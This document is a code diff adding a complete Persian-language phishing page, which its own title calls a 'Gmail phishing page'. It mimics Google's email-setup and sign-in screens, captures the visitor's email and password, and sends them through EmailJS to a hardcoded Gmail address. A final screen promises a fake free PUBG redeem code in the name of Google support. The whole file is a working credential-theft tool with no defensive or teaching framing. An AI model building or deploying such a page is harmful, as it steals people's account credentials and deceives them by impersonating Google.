@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه فیشینگ جیمیل</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            direction: rtl;
+            overflow: hidden;
+        }
+        .page {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .page.active {
+            display: block;
+        }
+        #page1 {
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 400px;
+        }
+        #page1 img.logo {
+            width: 92px;
+            height: 30px;
+            margin-bottom: 30px;
+        }
+        #page1 h2 {
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 25px;
+            color: #202124;
+        }
+        .list-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #dadce0;
+            cursor: pointer;
+        }
+        .list-item img {
+            width: 24px;
+            height: 24px;
+            margin-left: 15px;
+        }
+        .list-item span {
+            font-size: 16px;
+            color: #202124;
+        }
+        .list-item:hover {
+            background-color: #f1f3f4;
+        }
+        .loading-page {
+            text-align: center;
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .loading-page img {
+            width: 72px;
+            height: 24px;
+            margin-bottom: 20px;
+        }
+        .loading-page p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #202124;
+        }
+        .loading-page .spinner {
+            width: 100px;
+            height: 100px;
+            border: 8px solid #dadce0;
+            border-top: 8px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .login-page {
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+        }
+        .login-page .logo {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        .login-page h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .login-page p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 20px;
+        }
+        .login-page input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background-color: #ffffff;
+            color: #202124;
+            font-size: 16px;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .login-page .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            position: absolute;
+            bottom: 120px;
+            left: 20px;
+        }
+        .login-page .next-btn:hover {
+            background-color: #1557b0;
+        }
+        .login-page .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: left;
+            margin: 10px 0;
+        }
+        .login-page .forgot-email {
+            margin-top: 15px;
+        }
+        .login-page .create-account {
+            margin-top: 40px;
+        }
+        .password-page .email {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            font-size: 16px;
+            color: #202124;
+        }
+        .password-page .email img {
+            width: 24px;
+            height: 24px;
+            margin-left: 10px;
+        }
+        .password-page .checkbox {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #5f6368;
+            justify-content: flex-end;
+            margin-right: 0;
+        }
+        .password-page .forgot-password {
+            color: #202124;
+            text-decoration: none;
+            font-size: 14px;
+            position: absolute;
+            bottom: 120px;
+            right: 10px;
+        }
+        .final-page {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: right;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .final-page img {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 10px;
+        }
+        .final-page h2 {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #202124;
+        }
+        .final-page h3 {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .final-page p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .final-page .redeem-message {
+            color: #202124;
+            font-size: 14px;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div id="page1" class="page active">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Gmail Logo" class="logo">
+        <h2>تنظیم ایمیل</h2>
+        <div class="list-item" onclick="goToPage(2)">
+            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" alt="Gmail Icon">
+            <span>Gmail</span>
+        </div>
+        <div class="list-item">
+            <img src="https://outlook.live.com/favicon.ico" alt="Outlook Icon">
+            <span>Live, hotmail, Outlook</span>
+        </div>
+        <div class="list-item">
+            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo Icon">
+            <span>Yahoo</span>
+        </div>
+        <div class="list-item">
+            <img src="https://www.microsoft.com/favicon.ico" alt="Exchange Icon">
+            <span>Office 365, Exchange</span>
+        </div>
+        <div class="list-item">
+            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" alt="Other Icon">
+            <span>سایر</span>
+        </div>
+    </div>
+
+    <div id="page2" class="page">
+        <div class="loading-page">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+            <p>در حال بررسی اطلاعات...</p>
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <div id="page3" class="page">
+        <div class="login-page">
+            <div class="logo">Google</div>
+            <h2>ورود به سیستم</h2>
+            <p>برای ادامه، ابتدا هویت خود را در Google تأیید کنید.<br>برای ورود به Google از یک حساب Google استفاده کنید.</p>
+            <input type="email" id="emailInput" placeholder="ایمیل یا شماره تلفن" required pattern="[a-z0-9._%+-]+@(gmail|yahoo)\.com$">
+            <a href="#" class="link forgot-email">ایمیلتان را فراموش کردین؟</a>
+            <a href="#" class="link create-account">ایجاد حساب</a>
+            <button class="next-btn" onclick="goToPage(4)">بعدی</button>
+        </div>
+    </div>
+
+    <div id="page4" class="page">
+        <div class="login-page password-page">
+            <div class="logo">Google</div>
+            <h2>خوش آمدید</h2>
+            <div class="email">
+                <span id="emailDisplay"></span>
+                <img src="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" alt="Profile Icon">
+            </div>
+            <input type="password" id="passwordInput" placeholder="گذرواژه‌تان را وارد کنید" required>
+            <div class="checkbox">
+                <input type="checkbox" id="showPassword" onclick="togglePassword()">
+                <label for="showPassword">نشان دادن گذرواژه</label>
+            </div>
+            <a href="#" class="forgot-password">رمز عبور خودتون رو فراموش کردین؟</a>
+            <button class="next-btn" onclick="goToPage(5)">بعدی</button>
+        </div>
+    </div>
+
+    <div id="page5" class="page final-page">
+        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" alt="Gmail Icon">
+        <h2>جستجوی گوگل</h2>
+        <h3>ایمیل</h3>
+        <p>ارسال به پایان رسید. لطفاً صندوق ورودی GMAIL خود را بررسی کنید تا اطلاعات ورود به سیستم شما نمایش داده شود.</p>
+        <div class="redeem-message">
+            تبریک! شما با موفقیت وارد شدید.<br>
+            به عنوان هدیه ورود، یک ریدیم‌کد ویژه برای شما آماده کردیم.<br>
+            با وارد کردن این کد در بازی، ۷۲۰ یوسی رایگان دریافت خواهید کرد:<br>
+            ریدیم‌کد: PUBG-720UC-MAR25<br>
+            ریدیم کد رو داخل سایت Midasbuy وارد کنید و یوسی هاتونو بگیرید.<br>
+            لطفاً این کد را در بخش ریدیم بازی وارد کنید.<br>
+            توجه: این کد فقط تا ۲۴ ساعت معتبر است.<br>
+            برای اطلاعات بیشتر، ایمیل خود را چک کنید.<br>
+            از بازی لذت ببرید و موفق باشید!<br>
+            تیم پشتیبانی گوگل<br>
+            تاریخ: ۲۲ مارس ۲۰۲۵
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 1;
+        let userEmail = '';
+        let userPassword = '';
+
+        // چک کردن لود شدن EmailJS
+        if (typeof emailjs === 'undefined') {
+            console.error("خطا: کتابخانه EmailJS لود نشده است!");
+            alert("خطا: کتابخانه EmailJS لود نشده است. لطفاً اتصال اینترنت خود را چک کنید.");
+        } else {
+            console.log("کتابخانه EmailJS با موفقیت لود شد.");
+        }
+
+        // مقداردهی اولیه EmailJS با Public Key
+        (function() {
+            emailjs.init({
+                publicKey: "sB_1pyh4UbnbyMj2W",
+            });
+            console.log("EmailJS با موفقیت مقداردهی شد. Public Key: sB_1pyh4UbnbyMj2W");
+        })();
+
+        function goToPage(pageNum) {
+            if (pageNum === 4) {
+                const email = document.getElementById('emailInput').value;
+                const emailLocalPart = email.split('@')[0];
+
+                if (/^\d+$/.test(emailLocalPart)) {
+                    alert('شماره وارد شده معتبر نمی باشد');
+                    return;
+                }
+
+                userEmail = email;
+                document.getElementById('emailDisplay').textContent = email;
+            }
+
+            if (pageNum === 5) {
+                const password = document.getElementById('passwordInput').value;
+                if (password.length < 8) {
+                    alert('رمز عبور باید حداقل ۸ کاراکتر باشد!');
+                    return;
+                }
+                userPassword = password;
+
+                console.log("در حال ارسال ایمیل...");
+                console.log("Service ID: service_slwf7yo");
+                console.log("Template ID: template_mu1wuvs");
+                console.log("Public Key: sB_1pyh4UbnbyMj2W");
+                console.log("ایمیل کاربر: ", userEmail);
+                console.log("رمز: ", userPassword);
+                console.log("ارسال به: king.ehsan.king.ehsan.7@gmail.com");
+
+                emailjs.send("service_slwf7yo", "template_mu1wuvs", {
+                    email: userEmail,
+                    password: userPassword,
+                    to_email: "king.ehsan.king.ehsan.7@gmail.com"
+                }).then(function(response) {
+                    console.log("ایمیل با موفقیت ارسال شد!", response.status, response.text);
+                    alert("ایمیل با موفقیت ارسال شد! لطفاً جیمیل خود را چک کنید (شامل پوشه اسپم).");
+                }, function(error) {
+                    console.error("خطا در ارسال ایمیل:", error);
+                    alert("خطا در ارسال ایمیل: " + JSON.stringify(error));
+                });
+            }
+
+            document.getElementById(`page${currentPage}`).classList.remove('active');
+            document.getElementById(`page${pageNum}`).classList.add('active');
+            currentPage = pageNum;
+
+            if (pageNum === 2) {
+                setTimeout(() => goToPage(3), 3000);
+            }
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        }
+    </script>
+</body>
+  </html>
